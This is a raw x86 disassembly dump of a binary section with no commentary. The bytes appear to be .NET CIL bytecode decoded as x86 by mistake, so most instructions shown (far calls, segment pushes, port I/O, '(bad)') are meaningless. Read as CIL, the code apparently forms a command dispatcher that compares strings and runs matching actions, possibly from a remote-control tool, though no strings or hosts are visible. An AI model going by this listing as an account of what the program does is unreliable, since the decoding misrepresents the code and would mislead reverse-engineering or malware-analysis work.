  403c00:	38 a3 21 00 00 11    	cmp    %ah,0x11000021(%ebx)
  403c06:	23 72 b7             	and    -0x49(%edx),%esi
  403c09:	04 00                	add    $0x0,%al
  403c0b:	70 16                	jo     0x403c23
  403c0d:	28 69 00             	sub    %ch,0x0(%ecx)
  403c10:	00 0a                	add    %cl,(%edx)
  403c12:	16                   	push   %ss
  403c13:	33 28                	xor    (%eax),%ebp
  403c15:	72 b7                	jb     0x403bce
  403c17:	04 00                	add    $0x0,%al
  403c19:	70 7e                	jo     0x403c99
  403c1b:	19 00                	sbb    %eax,(%eax)
  403c1d:	00 04 28             	add    %al,(%eax,%ebp,1)
  403c20:	66 00 00             	data16 add %al,(%eax)
  403c23:	0a 28                	or     (%eax),%ch
  403c25:	38 00                	cmp    %al,(%eax)
  403c27:	00 06                	add    %al,(%esi)
  403c29:	28 66 00             	sub    %ah,0x0(%esi)
  403c2c:	00 0a                	add    %cl,(%edx)
  403c2e:	28 3b                	sub    %bh,(%ebx)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	1c 00                	sbb    $0x0,%al
  403c36:	00 06                	add    %al,(%esi)
  403c38:	38 6b 21             	cmp    %ch,0x21(%ebx)
  403c3b:	00 00                	add    %al,(%eax)
  403c3d:	11 23                	adc    %esp,(%ebx)
  403c3f:	72 bf                	jb     0x403c00
  403c41:	04 00                	add    $0x0,%al
  403c43:	70 16                	jo     0x403c5b
  403c45:	28 69 00             	sub    %ch,0x0(%ecx)
  403c48:	00 0a                	add    %cl,(%edx)
  403c4a:	16                   	push   %ss
  403c4b:	33 58 72             	xor    0x72(%eax),%ebx
  403c4e:	bf 04 00 70 7e       	mov    $0x7e700004,%edi
  403c53:	19 00                	sbb    %eax,(%eax)
  403c55:	00 04 28             	add    %al,(%eax,%ebp,1)
  403c58:	71 00                	jno    0x403c5a
  403c5a:	00 0a                	add    %cl,(%edx)
  403c5c:	06                   	push   %es
  403c5d:	7b 28                	jnp    0x403c87
  403c5f:	00 00                	add    %al,(%eax)
  403c61:	04 17                	add    $0x17,%al
  403c63:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403c6a:	72 c5                	jb     0x403c31
  403c6c:	04 00                	add    $0x0,%al
  403c6e:	70 16                	jo     0x403c86
  403c70:	8d 03                	lea    (%ebx),%eax
  403c72:	00 00                	add    %al,(%eax)
  403c74:	01 14 14             	add    %edx,(%esp,%edx,1)
  403c77:	14 28                	adc    $0x28,%al
  403c79:	72 00                	jb     0x403c7b
  403c7b:	00 0a                	add    %cl,(%edx)
  403c7d:	28 71 00             	sub    %dh,0x0(%ecx)
  403c80:	00 0a                	add    %cl,(%edx)
  403c82:	7e 19                	jle    0x403c9d
  403c84:	00 00                	add    %al,(%eax)
  403c86:	04 28                	add    $0x28,%al
  403c88:	71 00                	jno    0x403c8a
  403c8a:	00 0a                	add    %cl,(%edx)
  403c8c:	28 38                	sub    %bh,(%eax)
  403c8e:	00 00                	add    %al,(%eax)
  403c90:	06                   	push   %es
  403c91:	28 71 00             	sub    %dh,0x0(%ecx)
  403c94:	00 0a                	add    %cl,(%edx)
  403c96:	28 3b                	sub    %bh,(%ebx)
  403c98:	00 00                	add    %al,(%eax)
  403c9a:	0a 28                	or     (%eax),%ch
  403c9c:	1c 00                	sbb    $0x0,%al
  403c9e:	00 06                	add    %al,(%esi)
  403ca0:	38 03                	cmp    %al,(%ebx)
  403ca2:	21 00                	and    %eax,(%eax)
  403ca4:	00 11                	add    %dl,(%ecx)
  403ca6:	23 72 d5             	and    -0x2b(%edx),%esi
  403ca9:	04 00                	add    $0x0,%al
  403cab:	70 16                	jo     0x403cc3
  403cad:	28 69 00             	sub    %ch,0x0(%ecx)
  403cb0:	00 0a                	add    %cl,(%edx)
  403cb2:	16                   	push   %ss
  403cb3:	33 7a 06             	xor    0x6(%edx),%edi
  403cb6:	7b 28                	jnp    0x403ce0
  403cb8:	00 00                	add    %al,(%eax)
  403cba:	04 17                	add    $0x17,%al
  403cbc:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403cc3:	72 df                	jb     0x403ca4
  403cc5:	04 00                	add    $0x0,%al
  403cc7:	70 17                	jo     0x403ce0
  403cc9:	8d 03                	lea    (%ebx),%eax
  403ccb:	00 00                	add    %al,(%eax)
  403ccd:	01 13                	add    %edx,(%ebx)
  403ccf:	25 11 25 16 06       	and    $0x6162511,%eax
  403cd4:	7b 28                	jnp    0x403cfe
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	04 13                	add    $0x13,%al
  403cda:	29 11                	sub    %edx,(%ecx)
  403cdc:	29 18                	sub    %ebx,(%eax)
  403cde:	13 2a                	adc    (%edx),%ebp
  403ce0:	11 2a                	adc    %ebp,(%edx)
  403ce2:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  403ce9:	24 14                	and    $0x14,%al
  403ceb:	14 17                	adc    $0x17,%al
  403ced:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  403cf0:	00 01                	add    %al,(%ecx)
  403cf2:	13 26                	adc    (%esi),%esp
  403cf4:	11 26                	adc    %esp,(%esi)
  403cf6:	16                   	push   %ss
  403cf7:	17                   	pop    %ss
  403cf8:	9c                   	pushf
  403cf9:	11 26                	adc    %esp,(%esi)
  403cfb:	17                   	pop    %ss
  403cfc:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403d00:	0a 26                	or     (%esi),%ah
  403d02:	11 26                	adc    %esp,(%esi)
  403d04:	16                   	push   %ss
  403d05:	90                   	nop
  403d06:	2c 22                	sub    $0x22,%al
  403d08:	11 29                	adc    %ebp,(%ecx)
  403d0a:	11 2a                	adc    %ebp,(%edx)
  403d0c:	11 24 16             	adc    %esp,(%esi,%edx,1)
  403d0f:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  403d16:	28 00                	sub    %al,(%eax)
  403d18:	00 01                	add    %al,(%ecx)
  403d1a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  403d1d:	00 0a                	add    %cl,(%edx)
  403d1f:	28 6d 00             	sub    %ch,0x0(%ebp)
  403d22:	00 0a                	add    %cl,(%edx)
  403d24:	74 28                	je     0x403d4e
  403d26:	00 00                	add    %al,(%eax)
  403d28:	01 a2 38 79 20 00    	add    %esp,0x207938(%edx)
  403d2e:	00 11                	add    %dl,(%ecx)
  403d30:	23 72 ef             	and    -0x11(%edx),%esi
  403d33:	04 00                	add    $0x0,%al
  403d35:	70 16                	jo     0x403d4d
  403d37:	28 69 00             	sub    %ch,0x0(%ecx)
  403d3a:	00 0a                	add    %cl,(%edx)
  403d3c:	16                   	push   %ss
  403d3d:	33 28                	xor    (%eax),%ebp
  403d3f:	06                   	push   %es
  403d40:	7b 28                	jnp    0x403d6a
  403d42:	00 00                	add    %al,(%eax)
  403d44:	04 17                	add    $0x17,%al
  403d46:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403d4d:	72 f9                	jb     0x403d48
  403d4f:	04 00                	add    $0x0,%al
  403d51:	70 16                	jo     0x403d69
  403d53:	8d 03                	lea    (%ebx),%eax
  403d55:	00 00                	add    %al,(%eax)
  403d57:	01 14 14             	add    %edx,(%esp,%edx,1)
  403d5a:	14 17                	adc    $0x17,%al
  403d5c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403d60:	0a 26                	or     (%esi),%ah
  403d62:	38 41 20             	cmp    %al,0x20(%ecx)
  403d65:	00 00                	add    %al,(%eax)
  403d67:	11 23                	adc    %esp,(%ebx)
  403d69:	72 07                	jb     0x403d72
  403d6b:	05 00 70 16 28       	add    $0x28167000,%eax
  403d70:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403d76:	28 06                	sub    %al,(%esi)
  403d78:	7b 28                	jnp    0x403da2
  403d7a:	00 00                	add    %al,(%eax)
  403d7c:	04 17                	add    $0x17,%al
  403d7e:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403d85:	72 07                	jb     0x403d8e
  403d87:	05 00 70 16 8d       	add    $0x8d167000,%eax
  403d8c:	03 00                	add    (%eax),%eax
  403d8e:	00 01                	add    %al,(%ecx)
  403d90:	14 14                	adc    $0x14,%al
  403d92:	14 17                	adc    $0x17,%al
  403d94:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403d98:	0a 26                	or     (%esi),%ah
  403d9a:	38 09                	cmp    %cl,(%ecx)
  403d9c:	20 00                	and    %al,(%eax)
  403d9e:	00 11                	add    %dl,(%ecx)
  403da0:	23 72 11             	and    0x11(%edx),%esi
  403da3:	05 00 70 16 28       	add    $0x28167000,%eax
  403da8:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403dae:	42                   	inc    %edx
  403daf:	06                   	push   %es
  403db0:	7b 28                	jnp    0x403dda
  403db2:	00 00                	add    %al,(%eax)
  403db4:	04 17                	add    $0x17,%al
  403db6:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403dbd:	72 21                	jb     0x403de0
  403dbf:	05 00 70 17 8d       	add    $0x8d177000,%eax
  403dc4:	03 00                	add    (%eax),%eax
  403dc6:	00 01                	add    %al,(%ecx)
  403dc8:	13 25 11 25 16 06    	adc    0x6162511,%esp
  403dce:	7b 28                	jnp    0x403df8
  403dd0:	00 00                	add    %al,(%eax)
  403dd2:	04 18                	add    $0x18,%al
  403dd4:	9a 28 80 00 00 0a 8c 	lcall  $0x8c0a,$0x8028
  403ddb:	5a                   	pop    %edx
  403ddc:	00 00                	add    %al,(%eax)
  403dde:	01 a2 11 25 14 14    	add    %esp,0x14142511(%edx)
  403de4:	14 17                	adc    $0x17,%al
  403de6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403dea:	0a 26                	or     (%esi),%ah
  403dec:	38 b7 1f 00 00 11    	cmp    %dh,0x1100001f(%edi)
  403df2:	23 72 2d             	and    0x2d(%edx),%esi
  403df5:	05 00 70 16 28       	add    $0x28167000,%eax
  403dfa:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403e00:	42                   	inc    %edx
  403e01:	06                   	push   %es
  403e02:	7b 28                	jnp    0x403e2c
  403e04:	00 00                	add    %al,(%eax)
  403e06:	04 17                	add    $0x17,%al
  403e08:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403e0f:	72 37                	jb     0x403e48
  403e11:	05 00 70 17 8d       	add    $0x8d177000,%eax
  403e16:	03 00                	add    (%eax),%eax
  403e18:	00 01                	add    %al,(%ecx)
  403e1a:	13 25 11 25 16 06    	adc    0x6162511,%esp
  403e20:	7b 28                	jnp    0x403e4a
  403e22:	00 00                	add    %al,(%eax)
  403e24:	04 18                	add    $0x18,%al
  403e26:	9a 28 80 00 00 0a 8c 	lcall  $0x8c0a,$0x8028
  403e2d:	5a                   	pop    %edx
  403e2e:	00 00                	add    %al,(%eax)
  403e30:	01 a2 11 25 14 14    	add    %esp,0x14142511(%edx)
  403e36:	14 17                	adc    $0x17,%al
  403e38:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403e3c:	0a 26                	or     (%esi),%ah
  403e3e:	38 65 1f             	cmp    %ah,0x1f(%ebp)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	11 23                	adc    %esp,(%ebx)
  403e45:	72 41                	jb     0x403e88
  403e47:	05 00 70 16 28       	add    $0x28167000,%eax
  403e4c:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403e52:	28 72 41             	sub    %dh,0x41(%edx)
  403e55:	05 00 70 7e 19       	add    $0x197e7000,%eax
  403e5a:	00 00                	add    %al,(%eax)
  403e5c:	04 28                	add    $0x28,%al
  403e5e:	66 00 00             	data16 add %al,(%eax)
  403e61:	0a 28                	or     (%eax),%ch
  403e63:	38 00                	cmp    %al,(%eax)
  403e65:	00 06                	add    %al,(%esi)
  403e67:	28 66 00             	sub    %ah,0x0(%esi)
  403e6a:	00 0a                	add    %cl,(%edx)
  403e6c:	28 3b                	sub    %bh,(%ebx)
  403e6e:	00 00                	add    %al,(%eax)
  403e70:	0a 28                	or     (%eax),%ch
  403e72:	1c 00                	sbb    $0x0,%al
  403e74:	00 06                	add    %al,(%esi)
  403e76:	38 2d 1f 00 00 11    	cmp    %ch,0x1100001f
  403e7c:	23 72 49             	and    0x49(%edx),%esi
  403e7f:	05 00 70 16 28       	add    $0x28167000,%eax
  403e84:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403e8a:	3c 72                	cmp    $0x72,%al
  403e8c:	5d                   	pop    %ebp
  403e8d:	05 00 70 7e 19       	add    $0x197e7000,%eax
  403e92:	00 00                	add    %al,(%eax)
  403e94:	04 28                	add    $0x28,%al
  403e96:	71 00                	jno    0x403e98
  403e98:	00 0a                	add    %cl,(%edx)
  403e9a:	28 38                	sub    %bh,(%eax)
  403e9c:	00 00                	add    %al,(%eax)
  403e9e:	06                   	push   %es
  403e9f:	28 71 00             	sub    %dh,0x0(%ecx)
  403ea2:	00 0a                	add    %cl,(%edx)
  403ea4:	7e 19                	jle    0x403ebf
  403ea6:	00 00                	add    %al,(%eax)
  403ea8:	04 28                	add    $0x28,%al
  403eaa:	71 00                	jno    0x403eac
  403eac:	00 0a                	add    %cl,(%edx)
  403eae:	28 31                	sub    %dh,(%ecx)
  403eb0:	00 00                	add    %al,(%eax)
  403eb2:	06                   	push   %es
  403eb3:	28 71 00             	sub    %dh,0x0(%ecx)
  403eb6:	00 0a                	add    %cl,(%edx)
  403eb8:	28 3b                	sub    %bh,(%ebx)
  403eba:	00 00                	add    %al,(%eax)
  403ebc:	0a 28                	or     (%eax),%ch
  403ebe:	1c 00                	sbb    $0x0,%al
  403ec0:	00 06                	add    %al,(%esi)
  403ec2:	38 e1                	cmp    %ah,%cl
  403ec4:	1e                   	push   %ds
  403ec5:	00 00                	add    %al,(%eax)
  403ec7:	11 23                	adc    %esp,(%ebx)
  403ec9:	72 5d                	jb     0x403f28
  403ecb:	05 00 70 16 28       	add    $0x28167000,%eax
  403ed0:	69 00 00 0a 16 40    	imul   $0x40160a00,(%eax),%eax
  403ed6:	9b                   	fwait
  403ed7:	00 00                	add    %al,(%eax)
  403ed9:	00 72 5d             	add    %dh,0x5d(%edx)
  403edc:	05 00 70 7e 19       	add    $0x197e7000,%eax
  403ee1:	00 00                	add    %al,(%eax)
  403ee3:	04 28                	add    $0x28,%al
  403ee5:	71 00                	jno    0x403ee7
  403ee7:	00 0a                	add    %cl,(%edx)
  403ee9:	28 38                	sub    %bh,(%eax)
  403eeb:	00 00                	add    %al,(%eax)
  403eed:	06                   	push   %es
  403eee:	28 71 00             	sub    %dh,0x0(%ecx)
  403ef1:	00 0a                	add    %cl,(%edx)
  403ef3:	7e 19                	jle    0x403f0e
  403ef5:	00 00                	add    %al,(%eax)
  403ef7:	04 28                	add    $0x28,%al
  403ef9:	71 00                	jno    0x403efb
  403efb:	00 0a                	add    %cl,(%edx)
  403efd:	06                   	push   %es
  403efe:	7b 28                	jnp    0x403f28
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 17                	add    $0x17,%al
  403f04:	9a 28 2f 00 00 06 28 	lcall  $0x2806,$0x2f28
  403f0b:	71 00                	jno    0x403f0d
  403f0d:	00 0a                	add    %cl,(%edx)
  403f0f:	06                   	push   %es
  403f10:	7b 28                	jnp    0x403f3a
  403f12:	00 00                	add    %al,(%eax)
  403f14:	04 17                	add    $0x17,%al
  403f16:	9a 28 30 00 00 06 28 	lcall  $0x2806,$0x3028
  403f1d:	71 00                	jno    0x403f1f
  403f1f:	00 0a                	add    %cl,(%edx)
  403f21:	28 3b                	sub    %bh,(%ebx)
  403f23:	00 00                	add    %al,(%eax)
  403f25:	0a 28                	or     (%eax),%ch
  403f27:	1c 00                	sbb    $0x0,%al
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	de 43 28             	fiadds 0x28(%ebx)
  403f2e:	29 00                	sub    %eax,(%eax)
  403f30:	00 0a                	add    %cl,(%edx)
  403f32:	72 5d                	jb     0x403f91
  403f34:	05 00 70 7e 19       	add    $0x197e7000,%eax
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	04 28                	add    $0x28,%al
  403f3d:	71 00                	jno    0x403f3f
  403f3f:	00 0a                	add    %cl,(%edx)
  403f41:	28 38                	sub    %bh,(%eax)
  403f43:	00 00                	add    %al,(%eax)
  403f45:	06                   	push   %es
  403f46:	28 71 00             	sub    %dh,0x0(%ecx)
  403f49:	00 0a                	add    %cl,(%edx)
  403f4b:	7e 19                	jle    0x403f66
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 28                	add    $0x28,%al
  403f51:	71 00                	jno    0x403f53
  403f53:	00 0a                	add    %cl,(%edx)
  403f55:	72 75                	jb     0x403fcc
  403f57:	05 00 70 28 71       	add    $0x71287000,%eax
  403f5c:	00 00                	add    %al,(%eax)
  403f5e:	0a 28                	or     (%eax),%ch
  403f60:	3b 00                	cmp    (%eax),%eax
  403f62:	00 0a                	add    %cl,(%edx)
  403f64:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403f67:	00 06                	add    %al,(%esi)
  403f69:	28 2a                	sub    %ch,(%edx)
  403f6b:	00 00                	add    %al,(%eax)
  403f6d:	0a de                	or     %dh,%bl
  403f6f:	00 38                	add    %bh,(%eax)
  403f71:	33 1e                	xor    (%esi),%ebx
  403f73:	00 00                	add    %al,(%eax)
  403f75:	11 23                	adc    %esp,(%ebx)
  403f77:	72 81                	jb     0x403efa
  403f79:	05 00 70 16 28       	add    $0x28167000,%eax
  403f7e:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403f84:	4c                   	dec    %esp
  403f85:	06                   	push   %es
  403f86:	7b 28                	jnp    0x403fb0
  403f88:	00 00                	add    %al,(%eax)
  403f8a:	04 17                	add    $0x17,%al
  403f8c:	9a 13 33 11 33 72 8f 	lcall  $0x8f72,$0x33113313
  403f93:	05 00 70 16 28       	add    $0x28167000,%eax
  403f98:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403f9e:	10 06                	adc    %al,(%esi)
  403fa0:	7b 28                	jnp    0x403fca
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	04 18                	add    $0x18,%al
  403fa6:	9a 17 28 a0 00 00 0a 	lcall  $0xa00,$0xa02817
  403fad:	2b 1d 11 33 72 9d    	sub    0x9d723311,%ebx
  403fb3:	05 00 70 16 28       	add    $0x28167000,%eax
  403fb8:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403fbe:	0d 06 7b 28 00       	or     $0x287b06,%eax
  403fc3:	00 04 18             	add    %al,(%eax,%ebx,1)
  403fc6:	9a 28 9f 00 00 0a 38 	lcall  $0x380a,$0x9f28
  403fcd:	d7                   	xlat   %ds:(%ebx)
  403fce:	1d 00 00 11 23       	sbb    $0x23110000,%eax
  403fd3:	72 a7                	jb     0x403f7c
  403fd5:	05 00 70 16 28       	add    $0x28167000,%eax
  403fda:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  403fe0:	13 06                	adc    (%esi),%eax
  403fe2:	7b 28                	jnp    0x40400c
  403fe4:	00 00                	add    %al,(%eax)
  403fe6:	04 17                	add    $0x17,%al
  403fe8:	9a 28 7c 00 00 0a 26 	lcall  $0x260a,$0x7c28
  403fef:	38 b4 1d 00 00 11 23 	cmp    %dh,0x23110000(%ebp,%ebx,1)
  403ff6:	72 b7                	jb     0x403faf
  403ff8:	05 00 70 16 28       	add    $0x28167000,%eax
  403ffd:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  404003:	6f                   	outsl  %ds:(%esi),(%dx)
  404004:	06                   	push   %es
  404005:	7b 28                	jnp    0x40402f
  404007:	00 00                	add    %al,(%eax)
  404009:	04 17                	add    $0x17,%al
  40400b:	9a 13 34 11 34 72 8f 	lcall  $0x8f72,$0x34113413
  404012:	05 00 70 16 28       	add    $0x28167000,%eax
  404017:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  40401d:	21 28                	and    %ebp,(%eax)
  40401f:	04 00                	add    $0x0,%al
  404021:	00 06                	add    %al,(%esi)
  404023:	6f                   	outsl  %ds:(%esi),(%dx)
  404024:	a1 00 00 0a 06       	mov    0x60a0000,%eax
  404029:	7b 28                	jnp    0x404053
  40402b:	00 00                	add    %al,(%eax)
  40402d:	04 18                	add    $0x18,%al
  40402f:	9a 06 7b 28 00 00 04 	lcall  $0x400,$0x287b06
  404036:	19 9a 6f a2 00 00    	sbb    %ebx,0xa26f(%edx)
  40403c:	0a 2b                	or     (%ebx),%ch
  40403e:	2f                   	das
  40403f:	11 34 72             	adc    %esi,(%edx,%esi,2)
  404042:	9d                   	popf
  404043:	05 00 70 16 28       	add    $0x28167000,%eax
  404048:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  40404e:	1f                   	pop    %ds
  40404f:	28 04 00             	sub    %al,(%eax,%eax,1)
  404052:	00 06                	add    %al,(%esi)
  404054:	6f                   	outsl  %ds:(%esi),(%dx)
  404055:	a1 00 00 0a 06       	mov    0x60a0000,%eax
  40405a:	7b 28                	jnp    0x404084
  40405c:	00 00                	add    %al,(%eax)
  40405e:	04 18                	add    $0x18,%al
  404060:	9a 06 7b 28 00 00 04 	lcall  $0x400,$0x287b06
  404067:	19 9a 6f a3 00 00    	sbb    %ebx,0xa36f(%edx)
  40406d:	0a 38                	or     (%eax),%bh
  40406f:	35 1d 00 00 11       	xor    $0x1100001d,%eax
  404074:	23 72 c5             	and    -0x3b(%edx),%esi
  404077:	05 00 70 16 28       	add    $0x28167000,%eax
  40407c:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  404082:	69 28 04 00 00 06    	imul   $0x6000004,(%eax),%ebp
  404088:	6f                   	outsl  %ds:(%esi),(%dx)
  404089:	a1 00 00 0a 06       	mov    0x60a0000,%eax
  40408e:	7b 28                	jnp    0x4040b8
  404090:	00 00                	add    %al,(%eax)
  404092:	04 17                	add    $0x17,%al
  404094:	9a 6f a4 00 00 0a 13 	lcall  $0x130a,$0xa46f
  40409b:	0f 72                	(bad)
  40409d:	cd 05                	int    $0x5
  40409f:	00 70 7e             	add    %dh,0x7e(%eax)
  4040a2:	19 00                	sbb    %eax,(%eax)
  4040a4:	00 04 28             	add    %al,(%eax,%ebp,1)
  4040a7:	66 00 00             	data16 add %al,(%eax)
  4040aa:	0a 28                	or     (%eax),%ch
  4040ac:	38 00                	cmp    %al,(%eax)
  4040ae:	00 06                	add    %al,(%esi)
  4040b0:	7e 19                	jle    0x4040cb
  4040b2:	00 00                	add    %al,(%eax)
  4040b4:	04 28                	add    $0x28,%al
  4040b6:	71 00                	jno    0x4040b8
  4040b8:	00 0a                	add    %cl,(%edx)
  4040ba:	11 0f                	adc    %ecx,(%edi)
  4040bc:	28 71 00             	sub    %dh,0x0(%ecx)
  4040bf:	00 0a                	add    %cl,(%edx)
  4040c1:	7e 19                	jle    0x4040dc
  4040c3:	00 00                	add    %al,(%eax)
  4040c5:	04 28                	add    $0x28,%al
  4040c7:	71 00                	jno    0x4040c9
  4040c9:	00 0a                	add    %cl,(%edx)
  4040cb:	06                   	push   %es
  4040cc:	7b 28                	jnp    0x4040f6
  4040ce:	00 00                	add    %al,(%eax)
  4040d0:	04 17                	add    $0x17,%al
  4040d2:	9a 28 71 00 00 0a 28 	lcall  $0x280a,$0x7128
  4040d9:	66 00 00             	data16 add %al,(%eax)
  4040dc:	0a 28                	or     (%eax),%ch
  4040de:	3b 00                	cmp    (%eax),%eax
  4040e0:	00 0a                	add    %cl,(%edx)
  4040e2:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4040e5:	00 06                	add    %al,(%esi)
  4040e7:	38 bc 1c 00 00 11 23 	cmp    %bh,0x23110000(%esp,%ebx,1)
  4040ee:	72 db                	jb     0x4040cb
  4040f0:	05 00 70 16 28       	add    $0x28167000,%eax
  4040f5:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  4040fb:	2b 06                	sub    (%esi),%eax
  4040fd:	7b 28                	jnp    0x404127
  4040ff:	00 00                	add    %al,(%eax)
  404101:	04 17                	add    $0x17,%al
  404103:	9a 16 73 a5 00 00 0a 	lcall  $0xa00,$0xa57316
  40410a:	13 10                	adc    (%eax),%edx
  40410c:	11 10                	adc    %edx,(%eax)
  40410e:	06                   	push   %es
  40410f:	7b 28                	jnp    0x404139
  404111:	00 00                	add    %al,(%eax)
  404113:	04 18                	add    $0x18,%al
  404115:	9a 6f 94 00 00 0a 11 	lcall  $0x110a,$0x946f
  40411c:	10 6f a6             	adc    %ch,-0x5a(%edi)
  40411f:	00 00                	add    %al,(%eax)
  404121:	0a 38                	or     (%eax),%bh
  404123:	81 1c 00 00 11 23 72 	sbbl   $0x72231100,(%eax,%eax,1)
  40412a:	e7 05                	out    %eax,$0x5
  40412c:	00 70 16             	add    %dh,0x16(%eax)
  40412f:	28 69 00             	sub    %ch,0x0(%ecx)
  404132:	00 0a                	add    %cl,(%edx)
  404134:	16                   	push   %ss
  404135:	40                   	inc    %eax
  404136:	b3 00                	mov    $0x0,%bl
  404138:	00 00                	add    %al,(%eax)
  40413a:	73 36                	jae    0x404172
  40413c:	00 00                	add    %al,(%eax)
  40413e:	0a 13                	or     (%ebx),%dl
  404140:	11 06                	adc    %eax,(%esi)
  404142:	7b 28                	jnp    0x40416c
  404144:	00 00                	add    %al,(%eax)
  404146:	04 17                	add    $0x17,%al
  404148:	9a 73 a7 00 00 0a 13 	lcall  $0x130a,$0xa773
  40414f:	12 11                	adc    (%ecx),%dl
  404151:	12 06                	adc    (%esi),%al
  404153:	7b 28                	jnp    0x40417d
  404155:	00 00                	add    %al,(%eax)
  404157:	04 18                	add    $0x18,%al
  404159:	9a 28 80 00 00 0a 06 	lcall  $0x60a,$0x8028
  404160:	7b 28                	jnp    0x40418a
  404162:	00 00                	add    %al,(%eax)
  404164:	04 19                	add    $0x19,%al
  404166:	9a 28 80 00 00 0a 14 	lcall  $0x140a,$0x8028
  40416d:	fe 06                	incb   (%esi)
  40416f:	34 00                	xor    $0x0,%al
  404171:	00 06                	add    %al,(%esi)
  404173:	73 a8                	jae    0x40411d
  404175:	00 00                	add    %al,(%eax)
  404177:	0a 7e a9             	or     -0x57(%esi),%bh
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 6f aa             	or     -0x56(%edi),%ch
  40417f:	00 00                	add    %al,(%eax)
  404181:	0a 11                	or     (%ecx),%dl
  404183:	11 28                	adc    %ebp,(%eax)
  404185:	ab                   	stos   %eax,%es:(%edi)
  404186:	00 00                	add    %al,(%eax)
  404188:	0a 6f ac             	or     -0x54(%edi),%ch
  40418b:	00 00                	add    %al,(%eax)
  40418d:	0a de                	or     %dh,%bl
  40418f:	0c 11                	or     $0x11,%al
  404191:	12 2c 07             	adc    (%edi,%eax,1),%ch
  404194:	11 12                	adc    %edx,(%edx)
  404196:	6f                   	outsl  %ds:(%esi),(%dx)
  404197:	59                   	pop    %ecx
  404198:	00 00                	add    %al,(%eax)
  40419a:	0a dc                	or     %ah,%bl
  40419c:	72 e7                	jb     0x404185
  40419e:	05 00 70 7e 19       	add    $0x197e7000,%eax
  4041a3:	00 00                	add    %al,(%eax)
  4041a5:	04 28                	add    $0x28,%al
  4041a7:	66 00 00             	data16 add %al,(%eax)
  4041aa:	0a 28                	or     (%eax),%ch
  4041ac:	38 00                	cmp    %al,(%eax)
  4041ae:	00 06                	add    %al,(%esi)
  4041b0:	28 66 00             	sub    %ah,0x0(%esi)
  4041b3:	00 0a                	add    %cl,(%edx)
  4041b5:	7e 18                	jle    0x4041cf
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	04 28                	add    $0x28,%al
  4041bb:	66 00 00             	data16 add %al,(%eax)
  4041be:	0a 11                	or     (%ecx),%dl
  4041c0:	11 6f 4c             	adc    %ebp,0x4c(%edi)
  4041c3:	00 00                	add    %al,(%eax)
  4041c5:	0a 28                	or     (%eax),%ch
  4041c7:	37                   	aaa
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	06                   	push   %es
  4041cb:	28 66 00             	sub    %ah,0x0(%esi)
  4041ce:	00 0a                	add    %cl,(%edx)
  4041d0:	28 3b                	sub    %bh,(%ebx)
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	0a 28                	or     (%eax),%ch
  4041d6:	1c 00                	sbb    $0x0,%al
  4041d8:	00 06                	add    %al,(%esi)
  4041da:	de 0c 11             	fimuls (%ecx,%edx,1)
  4041dd:	11 2c 07             	adc    %ebp,(%edi,%eax,1)
  4041e0:	11 11                	adc    %edx,(%ecx)
  4041e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e3:	59                   	pop    %ecx
  4041e4:	00 00                	add    %al,(%eax)
  4041e6:	0a dc                	or     %ah,%bl
  4041e8:	38 bb 1b 00 00 11    	cmp    %bh,0x1100001b(%ebx)
  4041ee:	23 72 fb             	and    -0x5(%edx),%esi
  4041f1:	05 00 70 16 28       	add    $0x28167000,%eax
  4041f6:	69 00 00 0a 16 33    	imul   $0x33160a00,(%eax),%eax
  4041fc:	17                   	pop    %ss
  4041fd:	18 13                	sbb    %dl,(%ebx)
  4041ff:	13 06                	adc    (%esi),%eax
  404201:	7b 28                	jnp    0x40422b
  404203:	00 00                	add    %al,(%eax)
  404205:	04 17                	add    $0x17,%al
  404207:	9a 11 13 28 ad 00 00 	lcall  $0x0,$0xad281311
  40420e:	0a 38                	or     (%eax),%bh
  404210:	94                   	xchg   %eax,%esp
  404211:	1b 00                	sbb    (%eax),%eax
  404213:	00 11                	add    %dl,(%ecx)
